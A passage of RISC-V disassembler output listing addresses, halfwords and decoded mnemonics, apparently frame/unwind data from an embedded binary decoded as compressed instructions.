 5c4:	00d8                	addi	a4,sp,68
 5c6:	0000                	unimp
 5c8:	246c                	fld	fa1,200(s0)
 5ca:	8000                	0x8000
 5cc:	0000                	unimp
 5ce:	0000                	unimp
 5d0:	00b8                	addi	a4,sp,72
 5d2:	0000                	unimp
 5d4:	0000                	unimp
 5d6:	0000                	unimp
 5d8:	0e42                	slli	t3,t3,0x10
 5da:	4250                	lw	a2,4(a2)
 5dc:	0288                	addi	a0,sp,320
 5de:	0c42                	slli	s8,s8,0x10
 5e0:	0008                	0x8
 5e2:	ae02                	fsd	ft0,280(sp)
 5e4:	0cc8                	addi	a0,sp,596
 5e6:	5002                	0x5002
 5e8:	0e42                	slli	t3,t3,0x10
 5ea:	0000                	unimp
 5ec:	0000                	unimp
 5ee:	0000                	unimp
 5f0:	002c                	addi	a1,sp,8
 5f2:	0000                	unimp
 5f4:	00d8                	addi	a4,sp,68
 5f6:	0000                	unimp
 5f8:	2524                	fld	fs1,72(a0)
 5fa:	8000                	0x8000
 5fc:	0000                	unimp
 5fe:	0000                	unimp
 600:	00ce                	slli	ra,ra,0x13
 602:	0000                	unimp
 604:	0000                	unimp
 606:	0000                	unimp
 608:	0e42                	slli	t3,t3,0x10
 60a:	4250                	lw	a2,4(a2)
 60c:	0288                	addi	a0,sp,320
 60e:	0c42                	slli	s8,s8,0x10
 610:	0008                	0x8
 612:	c402                	sw	zero,8(sp)
 614:	0cc8                	addi	a0,sp,596
 616:	5002                	0x5002
 618:	0e42                	slli	t3,t3,0x10
 61a:	0000                	unimp
 61c:	0000                	unimp
 61e:	0000                	unimp
 620:	002c                	addi	a1,sp,8
 622:	0000                	unimp
 624:	00d8                	addi	a4,sp,68
 626:	0000                	unimp
 628:	25f2                	fld	fa1,280(sp)
 62a:	8000                	0x8000
 62c:	0000                	unimp
 62e:	0000                	unimp
 630:	003c                	addi	a5,sp,8
 632:	0000                	unimp
 634:	0000                	unimp
 636:	0000                	unimp
 638:	0e42                	slli	t3,t3,0x10
 63a:	4230                	lw	a2,64(a2)
 63c:	0288                	addi	a0,sp,320
 63e:	0c42                	slli	s8,s8,0x10
 640:	0008                	0x8
 642:	c872                	sw	t3,16(sp)
 644:	020c                	addi	a1,sp,256
 646:	4230                	lw	a2,64(a2)
 648:	000e                	c.slli	zero,0x3
 64a:	0000                	unimp
 64c:	0000                	unimp
 64e:	0000                	unimp
 650:	002c                	addi	a1,sp,8
 652:	0000                	unimp
 654:	00d8                	addi	a4,sp,68
 656:	0000                	unimp
 658:	262e                	fld	fa2,200(sp)
 65a:	8000                	0x8000
 65c:	0000                	unimp
 65e:	0000                	unimp
 660:	004e                	c.slli	zero,0x13
 662:	0000                	unimp
 664:	0000                	unimp
 666:	0000                	unimp
 668:	0e42                	slli	t3,t3,0x10
 66a:	4230                	lw	a2,64(a2)
 66c:	0288                	addi	a0,sp,320
 66e:	0c42                	slli	s8,s8,0x10
 670:	0008                	0x8
 672:	4402                	lw	s0,0(sp)
 674:	0cc8                	addi	a0,sp,596
 676:	3002                	fld	ft0,32(sp)
 678:	0e42                	slli	t3,t3,0x10
 67a:	0000                	unimp
 67c:	0000                	unimp
 67e:	0000                	unimp
 680:	002c                	addi	a1,sp,8
 682:	0000                	unimp
 684:	00d8                	addi	a4,sp,68
 686:	0000                	unimp
 688:	267c                	fld	fa5,200(a2)
 68a:	8000                	0x8000
 68c:	0000                	unimp
 68e:	0000                	unimp
 690:	0070                	addi	a2,sp,12
 692:	0000                	unimp
 694:	0000                	unimp
 696:	0000                	unimp
 698:	0e42                	slli	t3,t3,0x10
 69a:	4230                	lw	a2,64(a2)
 69c:	0288                	addi	a0,sp,320
 69e:	0c42                	slli	s8,s8,0x10
 6a0:	0008                	0x8
 6a2:	6602                	ld	a2,0(sp)
 6a4:	0cc8                	addi	a0,sp,596
 6a6:	3002                	fld	ft0,32(sp)
 6a8:	0e42                	slli	t3,t3,0x10
 6aa:	0000                	unimp
 6ac:	0000                	unimp
 6ae:	0000                	unimp
 6b0:	002c                	addi	a1,sp,8
 6b2:	0000                	unimp
 6b4:	00d8                	addi	a4,sp,68
 6b6:	0000                	unimp
 6b8:	26ec                	fld	fa1,200(a3)
 6ba:	8000                	0x8000
 6bc:	0000                	unimp
 6be:	0000                	unimp
 6c0:	004a                	c.slli	zero,0x12
 6c2:	0000                	unimp
 6c4:	0000                	unimp
 6c6:	0000                	unimp
 6c8:	0e42                	slli	t3,t3,0x10
 6ca:	4230                	lw	a2,64(a2)
 6cc:	0288                	addi	a0,sp,320
 6ce:	0c42                	slli	s8,s8,0x10
 6d0:	0008                	0x8
 6d2:	4002                	0x4002
 6d4:	0cc8                	addi	a0,sp,596
 6d6:	3002                	fld	ft0,32(sp)
 6d8:	0e42                	slli	t3,t3,0x10
 6da:	0000                	unimp
 6dc:	0000                	unimp
 6de:	0000                	unimp
 6e0:	002c                	addi	a1,sp,8
 6e2:	0000                	unimp
 6e4:	00d8                	addi	a4,sp,68
 6e6:	0000                	unimp
 6e8:	2736                	fld	fa4,328(sp)
 6ea:	8000                	0x8000
 6ec:	0000                	unimp
 6ee:	0000                	unimp
 6f0:	00dc                	addi	a5,sp,68
 6f2:	0000                	unimp
 6f4:	0000                	unimp
 6f6:	0000                	unimp
 6f8:	0e42                	slli	t3,t3,0x10
 6fa:	4230                	lw	a2,64(a2)
 6fc:	0288                	addi	a0,sp,320
 6fe:	0c42                	slli	s8,s8,0x10
 700:	0008                	0x8
 702:	d202                	sw	zero,36(sp)
 704:	0cc8                	addi	a0,sp,596
 706:	3002                	fld	ft0,32(sp)
 708:	0e42                	slli	t3,t3,0x10
 70a:	0000                	unimp
 70c:	0000                	unimp
	...
